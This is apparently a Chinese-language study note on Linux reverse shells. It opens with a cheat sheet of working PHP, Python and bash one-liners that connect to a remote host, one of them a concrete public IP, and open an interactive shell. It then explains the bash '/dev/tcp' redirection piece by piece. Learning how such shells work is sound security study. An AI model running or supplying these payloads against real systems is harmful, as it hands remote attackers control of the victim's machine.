### 反弹shell的姿势
参考：
- https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html

php
```bash
php -r '$sock=fsockopen("xxx.xxx.xxx",1234);exec("/bin/bash -i <&3 >&3 2>&3");'
```
  
python
```bash
python -c "exec(\"import socket, subprocess;s = socket.socket();s.connect(('127.0.0.1',9000))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```
  
bash
```bash
bash -i >& /dev/tcp/120.77.219.21/82 0>&1
exec 5<>/dev/tcp/120.77.219.21/82; cat <&5 | while read line; do $line 2>&5 >&5; done
```

### bash_shell反弹理解
参考：
- https://blog.csdn.net/qq_33020901/article/details/78600382

`bash -i >& /dev/tcp/120.77.219.21/82 0>&1`这样一个反弹shell的命令，我们可以拆分为多个部分进行理解。

**第一部分：`bash-i`**  
  
`bash -i`是启动一个交互式shell，可通过`echo $-`查看自己是否为交互式shell，返回的结果包含i就是交互式。

交互式和非交互式的区别在于：
- 交互式shell等待你的输入，执行你提交的命令，返回你结果。  
- 非交互式，shell不与你进行实时交互，而是读取存放在文件仲的命令并执行。

**第二部分：`/dev/tcp/ip/port`**

如：`/dev/tcp/192.168.9.9/82`，这个命令的意思就是和`192.168.9.9:82`这个ip地址的82端口建立tcp连接。

例子：
```bash
echo 'test'>/dev/tcp/192.168.9.9/82 #发送信息到TCP连接
cat </dev/tcp/192.168.9.9/82  #从TCP连接读取信息
```

**第三部分：`>`重定向和`0>&1`**

我们可以吧上面2个命令和`>`组合起来就是
```bash
bash -i > /dev/tcp/192.168.9.9/82  # 本机输入执行命令，目标机（tcp连接对象）输出执行结果
bash -i < /dev/tcp/192.168.9.9/82  # 目标及（tcp连接对象）输入执行命令，本机输出执行结果
```

接下来再把`0>&1`拼接进来
```bash
bash -i > /dev/tcp/192.168.9.9/82 0>&1
```

上面这个命令是综合了
```bash
bash -i > /dev/tcp/192.168.9.9/82
bash -i < /dev/tcp/192.168.9.9/82
```
的一个交互式shell，但是有缺陷，就是在本机输入要执行的命令，目标机会有回显。
![](/images/19-7-5_OS_Linux反弹shell1.png)
但是这不妨碍我们理解`0>&1`。
  
可以把`0>&1`看成目标机通过tcp连接获取本机的输入（id）。因此本机在bash中打印出`id`然后把执行结果通过`>`重定向由tcp连接发送给本机。

**第四部分：`>&`**  
在通常情况下,`>&`右边为数字（0，1，2）中的一个，表示重定向。但是如果`&`右边为字符的话，意思就不单纯了。如图
![](/images/19-7-5_OS_Linux反弹shell2.jpg)

意思就是：**`>&word`和`&>word`都表示的是把标准输出和标准错误同时重定向到某个文件，都相当于`>word 2>&1`**。

所以我们可以把`>&`拼接
```bash
bash -i >& /dev/tcp/192.168.9.9/82 0>&1
```
相当于：
```bash
bash -i >& /dev/tcp/192.168.9.9/82 0>&1 2>&1
```

这样就是一个完整的bash反弹shell了。我知道没有讲通，但是我想了很久，只能先硬啃了。